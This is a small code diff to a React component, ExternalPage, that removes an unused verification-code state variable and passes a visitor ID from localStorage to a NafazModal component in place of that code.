@@ -30,7 +30,6 @@ export default function ExternalPage({
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [isRejected] = useState(false);
   const [showModal, setShowModal] = useState(false);
-  const [verificationCode] = useState("");
   const _id = localStorage.getItem("visitor");
 
   const [phone] = useState(initialPhone);
@@ -87,7 +86,6 @@ export default function ExternalPage({
       setIsLoading(false);
     }
   };
-
   const SubmittedContent = () => (
     <div className="space-y-8 bg-[#daf2f6]">
       <FirestoreRedirect id={_id as string} collectionName={"pays"} />
@@ -223,7 +221,7 @@ export default function ExternalPage({
       <NafazModal
         isOpen={showModal}
         onClose={() => setShowModal(false)}
-        auth_number={verificationCode}
+        userId={_id as string}
         phone={phone}
       />
     </div>
